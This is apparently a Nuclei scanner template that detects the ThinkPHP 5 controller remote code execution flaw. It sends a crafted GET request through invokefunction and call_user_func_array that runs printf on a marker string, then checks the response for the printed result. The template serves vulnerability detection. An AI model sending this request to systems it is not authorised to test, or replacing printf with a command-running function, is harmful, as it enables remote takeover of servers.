id: thinkphp5-controller-rce
info:
  name: Thinkphp5 Controller Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,thinkphp
  description: |
    Thinkphp5 Controller remote code execution vulnerability.
http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "a29hbHIgaXMg%d2F0Y2hpbmcgeW9129"
